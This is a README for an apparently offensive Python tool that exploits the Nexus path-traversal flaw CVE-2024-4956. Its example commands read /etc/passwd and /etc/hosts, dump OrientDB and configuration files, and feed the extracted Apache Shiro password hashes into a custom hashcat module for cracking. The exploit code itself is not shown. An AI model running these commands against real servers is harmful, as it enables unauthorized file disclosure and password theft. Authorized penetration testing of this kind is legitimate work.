# CVE-2024-4956

This repository contains a Python utility for automating the exploitation of `CVE-2024-4956`.

The script aims to:
- Detect the LFI path down to root (using */etc/passwd* by default.) 
- Dump Orientdb PCL files by automatically parsing a disclosed database.ocf
- Test file paths and save contents of files off for later analysis. 

Included in this fork are two text files with paths:
1. nexus_paths.txt: relative paths to look for nexus configurations
2. paths.txt:       absolute paths to system/user configurations

Details for the vulnerability can be found [here](https://nvd.nist.gov/vuln/detail/CVE-2024-4956).

## Usage

```
usage: cve-2024-4956.py [-h] [-f FILE] [-c] [-l LFI] [-d] [-p PROXY] [-u URL]

CVE-2024-4956 Path Traversal Exploit Script

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  Path to the text file containing a list of file paths
                        to test
  -c, --check           Check path traversal
  -l LFI, --lfi LFI     File path argument for -c (default: /etc/passwd).
  -d, --dbfiles         Automatically retrieve OrientDB files
  -p, --proxy           Enable/disable the use of Burp proxy (default: False)
  -u URL, --url URL     Base URL of the target server
```

### Examples

Automatically walk the path traversal to disclose the contents of /etc/hosts:

`cve-2024-2956.py -c -l /etc/hosts -u http://nexus.server.local`

Dump the database contents using an http proxy:

`cve-2024-2956.py -d -p http://127.0.0.1:8080 -u http://nexus.server.local`

Dump nexus config files specified in nexus_paths.txt:

`cve-2024-2956.py -f nexus_paths.txt -u http://nexus.server.local`

## Other useful projects 

### Shiro1Extractor

A script for automating the extraction of Apache Shiro 1 hashes from OrientDB .pcl files is available [here](https://github.com/fin3ss3g0d/Shiro1Extractor) for extracting/gathering hashes to use with the Hashcat module.

### Hashcat Module

I have developed a custom Apache Shiro 1 hashcat module . It is available at my hashcat fork [here](https://github.com/fin3ss3g0d/hashcat). You can take the hashes extracted using this program and use them directly with the module. Here are the steps to use it:

1. Clone the [repository](https://github.com/fin3ss3g0d/hashcat)
2. Build it from source
3. Module is accessible using mode `12150`

I have submitted a [pull request](https://github.com/hashcat/hashcat/pull/4017) to the official Hashcat project, hopefully it will get merged and the module will be available via the official Hashcat repository! Blog post covering all of this coming soon!

### Shiro1Tools

[This repository](https://github.com/fin3ss3g0d/Shiro1Tools) contains useful tools that were used when creating the Hashcat module for Apache Shiro 1 such as a standalone `C` program that cracks Apache Shiro 1 hashes using OpenSSL and a `Java` application for generating Apache Shiro 1 hashes.

## Disclaimer

This program is intended for legitimate and authorized purposes only. The author holds no responsibility or liability for misuse of this project.